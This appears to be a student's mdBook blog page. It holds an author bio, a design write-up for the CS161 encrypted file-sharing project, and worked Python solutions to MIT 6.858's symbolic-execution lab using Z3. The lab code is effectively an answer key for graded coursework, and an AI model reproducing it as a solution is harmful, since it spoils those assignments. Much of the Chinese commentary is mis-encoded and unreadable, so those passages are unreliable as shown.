<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Sugar&#x27;s Blog</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="theme/toc.css">
        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="about.html">About</a></li><li class="chapter-item expanded affix "><li class="part-title">2023</li><li class="chapter-item expanded "><a href="blog20230222.html">CS 161 REGULUS</a></li><li class="chapter-item expanded "><a href="blog20230406.html">MIT 6.858 Lab3: Symbolic execution</a></li><li class="chapter-item expanded "><a href="blog20230110.html">Computer Security - Buffer overflows</a></li><li class="chapter-item expanded "><div>MIT 6.007 Signals And Systems</div></li><li class="chapter-item expanded affix "><li class="part-title">2022</li><li class="chapter-item expanded "><a href="blog20221209.html">æ¥ç‚¹utterances</a></li><li class="chapter-item expanded "><a href="blog20221129.html">çº¢é»‘æ ‘</a></li><li class="chapter-item expanded "><a href="blog20221113.html">B+Tree</a></li><li class="chapter-item expanded "><a href="blog20221105.html">CMU 15-445/645</a></li><li class="chapter-item expanded "><a href="blog20221028.html">æ„å»ºmdbookçš„åšå®¢</a></li><li class="spacer"></li><li class="chapter-item expanded "><a href="blog20220726.html">MIT 6.824 kvraft</a></li><li class="chapter-item expanded "><a href="blog20220630.html">MIT 6.S081 mmap</a></li><li class="chapter-item expanded "><a href="blog20220519.html">frpå†…ç½‘ç©¿é€å®è·µ</a></li><li class="chapter-item expanded "><a href="blog20220517.html">ç”»é¥¼</a></li><li class="chapter-item expanded "><a href="blog20220507.html">æ¯äº²èŠ‚å¿«ä¹</a></li><li class="chapter-item expanded "><a href="blog20220430.html">MIT 6.S081 File System</a></li><li class="chapter-item expanded "><a href="blog20220424.html">MIT 6.S081 Locks</a></li><li class="chapter-item expanded "><a href="blog20220422.html">Dockerå®è·µ</a></li><li class="chapter-item expanded "><a href="blog20220224.html">MIT 6.S081 Network Driver</a></li><li class="chapter-item expanded affix "><li class="part-title">2021</li><li class="chapter-item expanded "><a href="blog20211231.html">Slurmå•æœºéƒ¨ç½²</a></li><li class="chapter-item expanded "><a href="blog20211119.html">MIT 6.S081 COW</a></li><li class="chapter-item expanded "><a href="blog20211024.html">MIT 6.S081 Traps</a></li><li class="chapter-item expanded "><a href="blog20211017.html">MIT 6.S081 Page Tables</a></li><li class="chapter-item expanded "><a href="blog20211012.html">MIT 6.828 System calls</a></li><li class="chapter-item expanded "><a href="blog20210926.html">MIT 6.828 Util Lab</a></li><li class="chapter-item expanded "><a href="blog20210805.html">å¯é æ•°æ®ä¼ è¾“åè®®</a></li><li class="chapter-item expanded "><a href="blog20210715.html">CSAPP - Proxy Lab</a></li><li class="chapter-item expanded "><a href="blog20210512.html">Raft</a></li><li class="chapter-item expanded "><a href="blog20210503.html">CSAPP - Malloc Lab</a></li><li class="chapter-item expanded "><a href="blog20210419.html">CSAPP - Shell Lab</a></li><li class="chapter-item expanded "><a href="blog20210323.html">CSAPP - Cache Lab</a></li><li class="chapter-item expanded "><a href="blog20210308.html">CSAPP - Arch Lab</a></li><li class="chapter-item expanded "><a href="blog20210219.html">CSAPP - Attack Lab</a></li><li class="chapter-item expanded "><a href="blog20210206.html">CSAPP - Bomb Lab</a></li><li class="chapter-item expanded "><a href="blog20210203.html">CSAPP - Data Lab</a></li><li class="chapter-item expanded affix "><li class="part-title">2020</li><li class="chapter-item expanded "><a href="blog20201011.html">MIT 6.824 MapReduce</a></li><li class="chapter-item expanded "><a href="blog20200201.html">MagicCube</a></li><li class="chapter-item expanded "><a href="blog20200116.html">bluelog</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Sugar&#x27;s Blog</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/Sugar-Coder/Sugar-Coder.github.io" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <div class="sidetoc"><nav class="pagetoc"></nav></div>
                    <main>
                        <h1 id="about"><a class="header" href="#about">About</a></h1>
<p>This is where I share interesting things.</p>
<blockquote>
<p>Tell me and I forget. Show me and I remember. Involve me and I understand.</p>
</blockquote>
<p><img src="./images/about/brighton.jpg" alt="Brighton" /></p>
<p align="center">Photo by <a href="https://www.guomiabai.com/">Guo Bai</a> in Brighton</p>
<h2 id="hi-im-jinyang-shao"><a class="header" href="#hi-im-jinyang-shao">Hi, I'm Jinyang Shao</a></h2>
<p>I'm a graduate student in software engineering and I got a bachelor's degree in computer science in Wuhan University, China. Now I'm working on autonomous driving related tests in <a href="http://cstar.whu.edu.cn/en/index.html">CSTAR</a> Lab.</p>
<h2 id="publications"><a class="header" href="#publications">Publications</a></h2>
<ul>
<li>
<p><strong>Jinyang Shao</strong>, &quot;Testing Object Detection for Autonomous Driving Systems via 3D Reconstruction,&quot; 2021 IEEE/ACM 43rd International Conference on Software Engineering: Companion Proceedings (ICSE-Companion)</p>
</li>
<li>
<p>Xiangling Wang; Siqi Yang; <strong>Jinyang Shao</strong>; Jun Chang; Ge Gao; Ming Li; Jifeng Xuan, &quot;Object Removal for Testing Object Detection in Autonomous Vehicle Systems,&quot; 2021 IEEE 21st International Conference on Software Quality, Reliability and Security Companion (QRS-C)</p>
</li>
</ul>
<h2 id="contact"><a class="header" href="#contact">Contact</a></h2>
<p>ğŸ“§ shaojinyang@whu.edu.cn</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cs161-computer-security"><a class="header" href="#cs161-computer-security">CS161: Computer Security</a></h1>
<p><a href="https://fa22.cs161.org/proj2/">CS161</a> 2022 fall, project2, å®ç°ä¸€ä¸ªå¤šç”¨æˆ·æ–‡ä»¶åˆ†äº«ç³»ç»Ÿã€‚
ä»¥ä¸‹æ˜¯æˆ‘çš„è®¾è®¡æ–‡æ¡£ã€‚</p>
<h2 id="threat-model"><a class="header" href="#threat-model">Threat Model</a></h2>
<p>Assume that all adversaries know my source code.</p>
<h3 id="datastore-adversary"><a class="header" href="#datastore-adversary">Datastore Adversary</a></h3>
<p>Datastore is untrusted. The adversary can view the content of all requests to the Datastore API.
And the datastore can be modified by the adversary.</p>
<p>So everything stored in Datastore should be encrypted or hashed.</p>
<h3 id="revoked-user-adversary"><a class="header" href="#revoked-user-adversary">Revoked User Adversary</a></h3>
<p>User will record all of the requests that their client makes to <strong>Datastore</strong> and the corresponding responses.</p>
<p>When a user has their access to a shared file revoked, that user may be malicious and use the Datastore API directly.</p>
<h2 id="data-structure"><a class="header" href="#data-structure">Data structure</a></h2>
<p>User related structures: <em>UserInfo</em>, <em>UserMeta</em>. <em>UserInfo</em> has the pointer to the <em>UserMeta</em> block stored in the Datastore, which let the different login user endpoint access the latest metadata of the user (file ownership, sharing, asymmetric keys).</p>
<p>File structure (<em>FileHeader</em>).
The Owner of the file has the address to the <em>FileHeader</em> which contains the file related information (filename, content links). I user an array of UUIDs to record the content blocks, which improve the append operation efficiency.</p>
<p>Invitation structure (<em>InvitationBlock</em>). These block is used to communicate between the acceptor and the provider using asymmetric encryption. The <em>InvitationBlock</em> contains encrypted Address of FileHeader using the Public Key of the acceptor. And the <em>InvitationBlock</em> contains the provider's signature for integrity.</p>
<p>General structure.</p>
<ul>
<li><em>Address</em>. Contain two symmetric keys (EncKey, MacKey) and a UUID. With this structure, one can access the block in Datastore securely.</li>
<li><em>DatastoreValue</em>. Contain two member for storing encrypted data and its MAC. If I want to store a plaintext to Datastore, I serialize it, encrypt it and mac it to build a <em>DatastoreValue</em>structure. Then I can save this structure to Datastore related to an <em>Address</em>.</li>
</ul>
<h2 id="user-authentication"><a class="header" href="#user-authentication">User Authentication</a></h2>
<p>When user login, we deterministically find the User structure and check whether the password match the password hash. Then use the password (good source of entropy) to derived MAC key to check the User structure is untampper. The User struct save the login user's password for future keys' derivation (encryption key, mac key).</p>
<h2 id="file-storage-and-retrieval"><a class="header" href="#file-storage-and-retrieval">File Storage and Retrieval</a></h2>
<p>When user save a new file, user create new <em>FileHeader</em> and file related keys (symmetric). User save the mapping of the filename to <em>Address</em> of <em>FileHeader</em> in the table of users's metadata block. </p>
<p>The file owner retrieve the file content by directly access the <em>FileHeader</em>. The acceptor should first access the <em>InvitationBlock</em> to acquire the latest address of the <em>FileHeader</em>.</p>
<p>When appending, accessible user create new content block and add it's UUID to the <em>FileHeader</em>.</p>
<p>Both owners and acceptors use the same keys related to the File.</p>
<h2 id="file-sharing-and-revocation"><a class="header" href="#file-sharing-and-revocation">File Sharing and Revocation</a></h2>
<p>When user (owner or acceptor) want to share the file to another user, the user create a new <em>InvitationBlock</em> which contains the Address of the <em>FileHeader</em>. The provider give the UUID of the <em>InvitationBlock</em> to the acceptor.</p>
<p>When the owner wants to revoke from the acceptor, the owner delete the <em>InvitationBlock</em> and move the <em>FileHeader</em> to a new place (content blocks are also moved). Then the owner updates others <em>InvitationBlock</em> with new <em>FileHeader</em> address.</p>
<h2 id="cryptography-notes"><a class="header" href="#cryptography-notes">Cryptography Notes</a></h2>
<ul>
<li>When doing the symmetric encryption, we need to provide the initial vector (IV) for the cyphertext generation. But we do not need to record the IV because it will appear in the cypherblock. Each time we want to encrypt, we generate new IV.</li>
<li>Public Key is for encryption (Verify). Private Key is for decrption (Sign). Combine the asymmetric and symmetric cryptography to implement the secure and efficient communication over insecure channel.</li>
<li>Encrypt then Mac. Mac then Decrypt. Pay attension to the order. <a href="https://textbook.cs161.org/crypto/macs.html#87-authenticated-encryption">textbook</a></li>
<li>Use different symmetric keys for single data encryption and MAC. Prevent copy-paste attacks.</li>
<li>READ THE DOCUMENT CAREFULLY!</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="symbolic-execution"><a class="header" href="#symbolic-execution">Symbolic Execution</a></h1>
<p><a href="http://css.csail.mit.edu/6.858/2022/labs/lab3.html">Lab3</a>å®ç°äº†åœ¨Pythonç¨‹åºä¸Šçš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œå°†ç¨‹åºä¸­çš„åˆ†æ”¯æ¡ä»¶è½¬åŒ–ä¸ºçº¦æŸæ±‚è§£çš„constraintsï¼Œç”±çº¦æŸæ±‚è§£å™¨ <a href="https://github.com/Z3Prover/z3">Z3 solver</a> è¿›è¡Œæ±‚è§£ï¼Œè¿›è€Œè·å¾—ç¨‹åºçš„æ‰§è¡Œè¾“å…¥ï¼ˆæµ‹è¯•è¾“å…¥ï¼‰ï¼Œä½¿å¾—ç¨‹åºèƒ½æ²¿ç€ç‰¹å®šçš„åˆ†æ”¯è·¯çº¿æ‰§è¡Œï¼Œä»è€Œå‘ç°ç¨‹åºä¸­çš„Bugã€‚</p>
<h2 id="z3çš„åŸºæœ¬ä½¿ç”¨"><a class="header" href="#z3çš„åŸºæœ¬ä½¿ç”¨">Z3çš„åŸºæœ¬ä½¿ç”¨</a></h2>
<h3 id="exercise-1"><a class="header" href="#exercise-1">Exercise 1</a></h3>
<p>ä½¿ç”¨ä½è¿ç®—è®¡ç®—æ— ç¬¦å·æ•°ã€æœ‰ç¬¦å·æ•°çš„å¹³å‡å€¼ã€‚é™åˆ¶æ¡ä»¶æ˜¯ä¸èƒ½ä½¿ç”¨è¶…è¿‡32ä½çš„å˜é‡ã€‚
å®ç°çš„ç»“æœæ­£ç¡®ä¸å¦ä½¿ç”¨Z3è¿›è¡Œåˆ¤æ–­ã€‚æµ‹è¯•æ¡ä»¶æ˜¯<code>e = (avg != real_avg)</code>ã€‚å¦‚æœZ3æ‰¾åˆ°äº†èƒ½ä½¿æµ‹è¯•æ¡ä»¶æ»¡è¶³ï¼ˆsatï¼‰çš„è¾“å…¥ï¼Œé‚£ä¹ˆå°±è¯´æ˜æ±‚å¹³å‡æ•°çš„å®ç°æœ‰é”™è¯¯ï¼Œå³æ‰¾åˆ°äº†å¯ä»¥å¤ç°é”™è¯¯çš„ä¾‹å­ã€‚</p>
<h4 id="ä¸¤ä¸ªæ— ç¬¦å·æ•°çš„å¹³å‡æ•°"><a class="header" href="#ä¸¤ä¸ªæ— ç¬¦å·æ•°çš„å¹³å‡æ•°">ä¸¤ä¸ªæ— ç¬¦å·æ•°çš„å¹³å‡æ•°</a></h4>
<p>ä½¿ç”¨é€»è¾‘å³ç§»æ¥å®Œæˆ</p>
<pre><code class="language-python">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.
u_avg = z3.LShR(a, 1) + z3.LShR(b, 1) + (a &amp; b &amp; 1)  # çœ‹çœ‹ä¸¤ä¸ªæ•°çš„æœ€åä¸€ä½äºŒè¿›åˆ¶æ˜¯ä¸æ˜¯éƒ½æ˜¯1
</code></pre>
<h4 id="ä¸¤ä¸ªæœ‰ç¬¦å·æ•°çš„å¹³å‡æ•°"><a class="header" href="#ä¸¤ä¸ªæœ‰ç¬¦å·æ•°çš„å¹³å‡æ•°">ä¸¤ä¸ªæœ‰ç¬¦å·æ•°çš„å¹³å‡æ•°</a></h4>
<p>å‚è€ƒ <a href="https://doc.lagout.org/security/Hackers%20Delight.pdf">Hacker's Delight</a></p>
<pre><code class="language-python">t = (a &amp; b) + ((a ^ b) &gt;&gt; 1)
s_avg = t + ((z3.LShR(t, 31)) &amp; (a ^ b))
</code></pre>
<h2 id="concolic-execution-for-integers"><a class="header" href="#concolic-execution-for-integers">Concolic execution for integers</a></h2>
<p>ä¸ºäº†å®ç°æ··åˆæ‰§è¡Œï¼Œå¯¹æ•´æ•°çš„æ“ä½œè¦æœ‰è®°å½•ï¼Œ<code>fuzzy.py</code>ä¸­æä¾›äº†è¯­æ³•æ ‘èŠ‚ç‚¹çš„å®šä¹‰ï¼Œæ¯æ¬¡å¯¹äºæ•´æ•°çš„æ“ä½œéƒ½ä¼šè®°å½•æˆä¸€ä¸ªæ“ä½œèŠ‚ç‚¹ï¼Œè®°å½•ç¬¦å·å€¼ä¸çœŸå®å€¼ï¼Œä¾¿äºä¹‹åçš„ concolic execution.</p>
<h3 id="exercise-2"><a class="header" href="#exercise-2">Exercise 2</a></h3>
<p>å®ç°concolic_intçš„æ•´æ•°ä¹˜é™¤æ³•æ“ä½œï¼Œä»¥åŠè¯­æ³•æ ‘ä¸Šçš„æ“ä½œ
concolic_int æœ‰ä¸¤ä¸ªæˆå‘˜å˜é‡ï¼Œä¸€ä¸ªæ˜¯å˜é‡çš„çœŸå®å€¼ï¼Œä¸€ä¸ªæ˜¯ç¬¦å·å€¼
ç¬¬ä¸€æ­¥è¦å®ç° ç¬¦å·å€¼çš„ä¹˜æ³•,è¿”å›ç¬¦å·è¡¨ç¤ºçš„ä¹˜æ³•</p>
<pre><code class="language-python">class sym_mult(sym_binop):
  def _z3expr(self):
    return z3expr(self.a) * z3expr(self.b)

class sym_div(sym_binop):
  def _z3expr(self):
    return z3expr(self.a) / z3expr(self.b)
</code></pre>
<p>ç¬¬äºŒæ­¥è®¡ç®—ä¹˜æ³•çš„çœŸå®å€¼</p>
<pre><code class="language-python">class concolic_int(int):
  # ...
  def __floordiv__(self, o):
    if isinstance(o, concolic_int):
      res = self.__v // o.__v
    else:
      res = self.__v // o
    return concolic_int(sym_div(ast(self), ast(o)), res)
  
  def __mul__(self, o):
    if isinstance(o, concolic_int):
      res = self.__v * o.__v
    else:
      res = self.__v * o
    return concolic_int(sym_mult(ast(self), ast(o)), res)
</code></pre>
<h3 id="exercise-3"><a class="header" href="#exercise-3">Exercise 3</a></h3>
<p>ç†è§£ check-symex-int.pyï¼Œä¸ºäº†æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°<code>f(x)</code>çš„è¾“å…¥ï¼Œä½¿å¾—å‡½æ•°è¿”å›1234ï¼Œ
æ¯”è¾ƒè¿·æƒ‘äººçš„æ˜¯test_fä¸­çš„æ“ä½œï¼Œå…ˆä½¿ç”¨fuzzyç”Ÿæˆäº†ä¸€ä¸ªå…¨å±€çš„int ç¬¦å·å˜é‡å¹¶èµ‹å€¼ä¸º1ï¼Œ
ä½†æ˜¯è¿™ä¸ªæ“ä½œå…¶å®å‘ç”Ÿåœ¨ <code>fuzzy.concolic_exec_input</code> çš„é¡ºåºå¦‚ä¸‹ï¼Œ</p>
<pre><code class="language-python">concrete_values.mk_global()
v = testfunc()  # testfuncä¸­çš„mk_intçš„æ“ä½œä¼šæ£€æŸ¥globalå˜é‡ä¸­æ˜¯å¦æœ‰é‡åçš„ï¼Œå¦‚æœæœ‰ï¼Œå°±ä¸å†è¦†ç›–äº†
</code></pre>
<p>ç›´æ¥ç”¨concrete_valuesä¸­çš„å€¼æ¥è¦†ç›–äº†åŸæ¥è®¾å®šçš„å˜é‡å€¼ï¼Œå³ä½¿testfuncä¸­æœ‰è®¾å®šå˜é‡å€¼çš„æ“ä½œï¼Œå¦‚æœè¯¥å…¨å±€å˜é‡å·²ç»å­˜åœ¨ï¼Œåˆ™ç›´æ¥è¿”å›(fuzzy.ConcreteValues.mk_int)ã€‚</p>
<p>æ‰€ä»¥è§£ç­”ä¸­ï¼Œç›´æ¥è°ƒç”¨ConcreteValues.add å³å¯è®¾å®š 'i' çš„å€¼:</p>
<pre><code class="language-python"># symex_exercises.py
import symex.fuzzy as fuzzy

def make_a_test_case():
  concrete_values = fuzzy.ConcreteValues()
  ## Your solution here: add the right value to concrete_values
  concrete_values.add('i', 7 * 123)
  return concrete_values
</code></pre>
<h3 id="exercise-4"><a class="header" href="#exercise-4">Exercise 4</a></h3>
<p>è°ƒç”¨z3çš„solver (wrapped by fork_and_check, timeoutç‰ˆæœ¬çš„solver)ï¼Œå¯»æ‰¾æ»¡è¶³constraintçš„å˜é‡çš„values</p>
<pre><code class="language-python">def concolic_find_input(constraint, ok_names, verbose=0):
  (ok, model) = fork_and_check(constraint)
  if ok == z3.sat:
    concrete_values = ConcreteValues()
    for (k, v) in model.items():
      if k in ok_names:
        concrete_values.add(k, v)
    return True, concrete_values
  return False, ConcreteValues()
</code></pre>
<h3 id="exercise-5"><a class="header" href="#exercise-5">Exercise 5</a></h3>
<p>å®ç°<code>concolic_force_branch</code>ï¼Œå°†æ¡ä»¶è¯­å¥ä¸­çš„ç¬¬bä¸ªæ¡ä»¶ç½®åï¼Œè¿”å›æ–°çš„constraint (ç”¨sym_andè¿æ¥)ã€‚
æ³¨æ„ç¬¬bä¸ªæ¡ä»¶çš„åé¢çš„æ¡ä»¶å°±ä¸ç”¨è®¾ç½®äº†ï¼Œå› ä¸ºåªå…³æ³¨äºèƒ½å¦èµ°åˆ°bä¸ªæ¡ä»¶çš„æŒ‡å®šåˆ†æ”¯ã€‚</p>
<pre><code class="language-python">def concolic_force_branch(b, branch_conds, branch_callers, verbose = 1):
  constraint = None
  temp = branch_conds[:b]  # åªå–å‰b-1ä¸ªæ¡ä»¶
  constraint = sym_and(*temp,sym_not(branch_conds[b]))

  # è¿™æ˜¯æˆ‘åŸæ¥çš„å®ç°ï¼Œä½†æ˜¯å‘ç°
  # if b &lt; len(branch_callers) and b &gt;= 0:
  #   new_conds = []
  #   for (i, cond) in enumerate(branch_conds):
  #     if i == b:
  #       new_conds.append(sym_not(cond))
  #     else:
  #       new_conds.append(cond)
  #   constraint = sym_and(*new_conds)

  if verbose &gt; 2:
    callers = branch_callers[b]
    print('Trying to branch at %s:%d:' % (callers[0], callers[1]))
    if constraint is not None:
      print(indent(z3expr(constraint).sexpr()))

  if constraint is None:
    return const_bool(True)
  else:
    return constraint
</code></pre>
<h3 id="exercise-6"><a class="header" href="#exercise-6">Exercise 6</a></h3>
<p>å®ç°<code>concolic_execs</code>ï¼Œæ··åˆæ‰§è¡Œç¬¦å·åŒ–è¾“å…¥çš„å¾…æµ‹å‡½æ•°
å…³é”®å‡½æ•°çš„ä½œç”¨ï¼š</p>
<ul>
<li><code>concolic_exec_input</code>: ä½¿ç”¨å…·ä½“çš„valuesæ¥æ‰§è¡Œè¢«æµ‹å‡½æ•°ï¼Œè¿”å›æ‰§è¡Œç»“æœ</li>
<li><code>concolic_find_input</code>: çº¦æŸæ±‚è§£ï¼Œè¿”å›æ»¡è¶³çº¦æŸçš„å˜é‡å€¼</li>
<li><code>concolic_force_branch</code>: å¼ºåˆ¶æ‰§è¡Œæ¡ä»¶è¯­å¥ï¼Œè¿”å›çº¦æŸ</li>
</ul>
<p>æ‰¾åˆ°å‡½æ•°çš„æ‰€æœ‰æ‰§è¡Œå¯èƒ½çš„è·¯å¾„ï¼Œè¿”å›å‡½æ•°çš„æ‰€æœ‰å¯èƒ½è¿”å›å€¼</p>
<p>concolic_boolæ¯æ¬¡éƒ½ä¼šæŠŠé‡åˆ°çš„æ¡ä»¶åŠ å…¥åˆ°å…¨å±€çš„global_constraintï¼Œä½œä¸ºå½“å‰æ‰§è¡Œè·¯å¾„ä¸‹çš„æ¡ä»¶çº¦æŸé›†åˆ</p>
<p>é—®é¢˜ï¼š
æ€ä¹ˆç¡®å®šåˆå§‹çš„concrete_valuesï¼Ÿ
å‘ç°check-symes-intä¸­çš„test_få·²ç»æŠŠiæ³¨å†Œåˆ°å…¨å±€çš„concrete_valuesä¸­äº†</p>
<p>InputQueue ä¿å­˜å¾…è¿è¡Œçš„å€¼</p>
<pre><code class="language-python">def concolic_execs(func, maxiter = 100, verbose = 0):
  ## &quot;checked&quot; is the set of constraints we already sent to Z3 for
  ## checking.  use this to eliminate duplicate paths.
  checked = set()

  ## output values
  outs = []

  ## list of inputs we should try to explore.
  inputs = InputQueue()

  iter = 0
  while iter &lt; maxiter and not inputs.empty():
    iter += 1
    concrete_values = inputs.get()
    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)
    if r not in outs:
      outs.append(r)

    # my implementation
    for i in range(0, len(branch_conds)):  # iterate through every condition
      and_constr = sym_and(*branch_conds[:i+1])
      if and_constr in checked:
        continue
      checked.add(and_constr)
      (ok , vals) = concolic_find_input(and_constr, concrete_values.var_names(), verbose)
      if ok:
        # vals.inherit(concrete_values)
        inputs.add(vals, branch_callers[i])
        concrete_values.inherit(vals)

      neg_constr = concolic_force_branch(i, branch_conds, branch_callers, verbose) # force branch
      checked.add(neg_constr)
      (ok, vals) = concolic_find_input(neg_constr, concrete_values.var_names(), verbose)
      if ok:
        # vals.inherit(concrete_values) # inherit from base concrete_values
        inputs.add(vals, branch_callers[i])  # add to inputs
        concrete_values.inherit(vals)
      
    # my old implementation, forget the positive branches condition
    # for i in range(0, len(branch_conds)):  # iterate through every condition
    #   constr = concolic_force_branch(i, branch_conds, branch_callers, verbose) # force branch
    #   if constr in checked:
    #     continue
    #   checked.add(constr)
    #   (ok, vals) = concolic_find_input(constr, list(concrete_values.var_names()), verbose)
    #   if ok:
    #     vals.inherit(concrete_values) # inherit from base concrete_values
    #     inputs.add(vals, branch_callers[i])  # add to inputs
    #   else:
    #     if verbose &gt; 0:
    #       print('canot find the proper constraint')

  if verbose &gt; 0:
    print('Stopping after', iter, 'iterations')

  return outs
</code></pre>
<h2 id="concolic-execution-for-strings"><a class="header" href="#concolic-execution-for-strings">Concolic execution for strings</a></h2>
<h3 id="exercise-7"><a class="header" href="#exercise-7">Exercise 7</a></h3>
<p>å®ç° <code>__len__</code> å’Œ<code>__contains__</code>ï¼Œæ³¨æ„è¦è¿”å›concolicçš„wrapper</p>
<pre><code class="language-python">class concolic_str(str):
  # ...
  def __len__(self):
    return concolic_int(sym_length(ast(self)), len(self.__v))

  def __contains__(self, item):
    if isinstance(item, concolic_str):
      res = item.__v in self.__v
    else:
      res = item in self.__v
    return concolic_bool(sym_contains(ast(self), ast(item)), res)
</code></pre>
<p>ä½†æ˜¯å‘ç° <code>check_symex-str.py</code>ä¸èƒ½æ‰¾åˆ° <code>len(s) &gt; 30</code>çš„è¾“å…¥</p>
<h3 id="exercise-8"><a class="header" href="#exercise-8">Exercise 8</a></h3>
<p>åŒ…è£…<code>sqlalchemy.orm.query.Query.get</code>å‡½æ•°ï¼Œ<code>new_get</code>å‡½æ•°æ¥å—çš„primary_keyå‚æ•°æ˜¯ç¬¦å·æ‰§è¡Œçš„concolic_value</p>
<p>é—®é¢˜ï¼š
<code>row = query.get(primary_key.__v)  # todo: cannot access the private field</code></p>
<p>è§£å†³ï¼š
select *ï¼Œå†æ¥è·Ÿconcolic_stræ¯”è¾ƒåˆ¤æ–­é€‰å–çš„rowæ˜¯å¦åŒ…å«è¦æŸ¥è¯¢çš„primarykeyï¼Œ
é€šè¿‡æ¯”è¾ƒ<code>==</code>è¿ç®—ç¬¦æ¯”è¾ƒconcolic_strï¼Œè¿›è€Œæ„é€ constraints</p>
<pre><code class="language-python">def newget(query, primary_key):
  rows = query.all()
  for row in rows:
    pk_name = row.__table__.primary_key.columns.keys()[0]
    if getattr(row, pk_name) == primary_key:
      return row
  return None
</code></pre>
<h2 id="concolic-execution-for-zoobars"><a class="header" href="#concolic-execution-for-zoobars">Concolic execution for zoobars</a></h2>
<h3 id="exercise-9"><a class="header" href="#exercise-9">Exercise 9</a></h3>
<p>invariant checks</p>
<p>zoobarsä»£è¡¨äº†è½¬è´¦çš„é‡‘é¢</p>
